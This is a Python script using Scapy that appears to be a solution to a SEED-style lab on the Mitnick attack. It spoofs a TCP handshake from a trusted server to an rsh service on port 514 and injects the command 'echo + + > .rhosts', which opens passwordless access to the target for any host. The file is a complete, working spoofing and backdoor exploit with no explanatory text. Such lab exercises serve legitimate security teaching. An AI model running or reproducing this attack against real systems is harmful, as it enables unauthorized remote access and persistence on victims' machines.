#!/usr/bin/python3
from scapy.all import *

x_ip = "10.9.0.5"
srv_ip = "10.9.0.6"

x_mac = "2e:a8:cf:89:06:2d"
srv_mac = "a6:aa:84:f0:b9:5e"

x_port = 514
srv_port = 1023

iface_name = "br-8794a46d7e29"

my_seq = 0x1000
rsh_port = 9090

def send_l2(pkt):
    frame = Ether(src=srv_mac, dst=x_mac) / pkt
    sendp(frame, iface=iface_name, verbose=0)

def spoof(pkt):
    if IP not in pkt or TCP not in pkt:
        return

    old_ip = pkt[IP]
    old_tcp = pkt[TCP]

    print("{}:{} -> {}:{} Flags={} Seq={} Ack={}".format(
        old_ip.src,
        old_tcp.sport,
        old_ip.dst,
        old_tcp.dport,
        old_tcp.flags,
        old_tcp.seq,
        old_tcp.ack
    ))

    if old_ip.src == x_ip and old_ip.dst == srv_ip:
        if old_tcp.sport == x_port and old_tcp.dport == srv_port:
            if old_tcp.flags == "SA":
                print("[+] Got SYN+ACK from X-Terminal")

                ip = IP(src=srv_ip, dst=x_ip)

                ack_pkt = ip / TCP(
                    sport=srv_port,
                    dport=x_port,
                    flags="A",
                    seq=my_seq + 1,
                    ack=old_tcp.seq + 1
                )

                send_l2(ack_pkt)
                print("[+] Sent spoofed ACK")

                data = "9090\x00seed\x00seed\x00echo + + > .rhosts\x00"


                data_pkt = ip / TCP(
                    sport=srv_port,
                    dport=x_port,
                    flags="PA",
                    seq=my_seq + 1,
                    ack=old_tcp.seq + 1
                ) / data

                send_l2(data_pkt)
                print("[+] Sent rsh data")

syn_pkt = IP(src=srv_ip, dst=x_ip) / TCP(
    sport=srv_port,
    dport=x_port,
    flags="S",
    seq=my_seq
)

send_l2(syn_pkt)
print("[+] Sent spoofed SYN")

my_filter = "tcp and src host 10.9.0.5 and dst host 10.9.0.6 and src port 514 and dst port 1023"
sniff(iface=iface_name, filter=my_filter, prn=spoof)
